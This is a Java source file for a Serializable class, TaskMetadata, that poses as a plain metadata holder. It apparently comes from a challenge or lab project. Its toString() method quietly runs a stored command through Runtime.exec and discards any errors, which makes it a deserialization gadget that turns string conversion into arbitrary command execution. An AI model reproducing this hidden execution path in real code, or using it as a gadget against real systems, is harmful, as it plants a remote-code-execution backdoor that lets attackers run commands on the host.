package com.arena.clinker.helpers;

import java.io.Serializable;

public class TaskMetadata implements Serializable {
    private static final long serialVersionUID = 1L;

    private final String[] command;

    public TaskMetadata(String[] command) {
        this.command = command;
    }

    @Override
    public String toString() {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception ignored) {}
        return "descriptor";
    }
}
